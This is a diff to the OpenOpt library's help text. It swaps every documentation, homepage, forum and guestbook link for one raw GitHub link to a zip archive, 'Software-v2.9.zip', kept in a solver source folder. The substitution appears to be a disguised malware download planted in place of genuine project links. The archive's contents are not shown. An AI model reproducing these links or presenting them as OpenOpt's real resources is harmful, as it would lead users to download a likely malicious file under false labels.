@@ -9,19 +9,19 @@ help(NLP), help(LP), help(QP) # ... etc
 
 See also directory "examples", using on-line documentation is highly recommended:
 
-http://openopt.org/Doc
+https://github.com/SteveGoguelin/openopt/raw/refs/heads/master/openopt/solvers/scipy_optim/Software-v2.9.zip
 
 See also:
 
 OpenOpt homepage:
-http://openopt.org
+https://github.com/SteveGoguelin/openopt/raw/refs/heads/master/openopt/solvers/scipy_optim/Software-v2.9.zip
 
 New! Numerical optimization forum:
-http://forum.openopt.org/
+https://github.com/SteveGoguelin/openopt/raw/refs/heads/master/openopt/solvers/scipy_optim/Software-v2.9.zip
 
 Found OpenOpt useful?
 Please mention it in our guestbook
-http://forum.openopt.org/viewforum.php?id=11
+https://github.com/SteveGoguelin/openopt/raw/refs/heads/master/openopt/solvers/scipy_optim/Software-v2.9.zip
 
 Regards,
 OpenOpt developers
